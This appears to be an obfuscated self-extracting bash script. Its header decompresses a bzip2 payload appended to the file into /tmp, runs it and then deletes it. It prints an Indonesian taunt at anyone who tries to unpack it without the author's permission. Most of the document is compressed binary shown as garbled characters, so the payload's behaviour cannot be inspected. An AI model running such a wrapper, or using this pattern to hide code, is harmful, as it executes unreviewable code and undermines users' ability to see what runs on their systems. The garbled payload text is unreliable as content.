#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY9��� T��p� }�����������`�    h    1�2a 1�4h��h   Ԑ���� P      �ѣh�&b��F� i��  1�2a 1�4h��h  �ѣh�&b��F� i��  R"b1�B0&�S���1I=I����UL��Y��Lo�'�����J�B������EN5u�������SDG�DDZDG�;݂h�{�:�H?��ț�cH�h�B�y������h��#�~?�q'�'��а��,���Ys-����i&�f�M��ޏ������yُ+�zf����hI
$3��q#\�kʊ��HH��s�̡"? �dI0���L������������|3���#�5���0v
Hl,d��#9��I�3�6������R�.���8�{���	.���yJ�-&�d�)��O��gפ�{�����գ�ޢQW�a��3k��,h5\MfFTo}5�԰G���jގEϣe��n���N�MB�͋�"u�D[\)��`^��U�j��&�|�6<�Vᕗݬ��qO�\</�l�$P�w"�{e�Zn7Z�U��a��^�w<x[ѵ�8[7��5���tD�kq-$�`GP���$>g[�V������"�u�$����&u����#�ȏm<�*���66�!v8�;��_Y��y!n�{�$���؉���S	*9x��[�YDY��b��m�]�;�<�##���\��Ę�}1���5ⵈŸ�g2����E=[������uf=���d��oKԛ�1G�5c�Ƶ��Y��U���S����M�r�R�[�H��9���0<FŴ����_LoJCJ��e/4�j�ĵl۹��s_�+J}M&E�u~�*ZSɷ��dS��R�Q~��_�U��^Vq(ܥ8[n$�ZS%�ݹ���4�4v����+����6&zW�y[���<��EԺ�����6Ɛ�#&kOc^ѵ�E[3��v7�J��
yR�����h~��*��/�r�g�����y��{�Z{1j�8\�q�?d�"�%4�ۖ(�rit�:��/'5+T�=��V ��x�CS��Ű��P��f�H+����m%ӣ��9`n�]���&�C�Ѧ�~P��%˗��^Βٰ���׌�u�6tx<�K�m�8�b�iD�NiT(�b=k�u�}�O���R�����ST����Df;�V�!#I��O����'{3�L4��5҂��zx��!��t��K��c�V{
6�~VU�Zq����fT�K��X�Ɇd���)�R�^���"��Dw2(��dj6�����1��h!q�5�؞i�����.m-�`KP�M�h�q��B;VG����kO��B�]����$��zHv�(X��[�A�&�I'��GF�6�����5��Ά3�D�$��46x^.�nr+��h�s������
�'$��8�2�c2b�KOT%	S$;T4�y���5!���/���O�h�����b�Z�aL<.#)m[��!�	5�c2��r{!����J?�n�����.��(�t#Y�b���zG"�ʤ��ZIC��w;�-_G$qő*�{��tW▻�V�x�45�J.��8Z��^nX�7W�yz���i�,��l�E�܊Z��L���Q�-����X�ܣ4s$��#��m�/	D���ƇN'I�3q˾%5������DhP��!h�,�71�F���Xm�H��r�Q�9�P�S(Z9���v:L�i8�,c_l
ݫ�I��1Bۊ5�^�*�Ѷ�c;��,E��G2*C}G�7RM5�l�`Z,IR�O>�1���eZ���$�6���zM�C2��b���4T$���H����O�9����_�	����F<q���!��E#�ZL��W��%F�
�Lщ��HR�W
�]sn��MEn1���-�\���A錯�֊�݁�~<�M�m�x��h�����r�m�>��x����������j����"GC ��!�k�0�Mк�#��"�(H�Fπ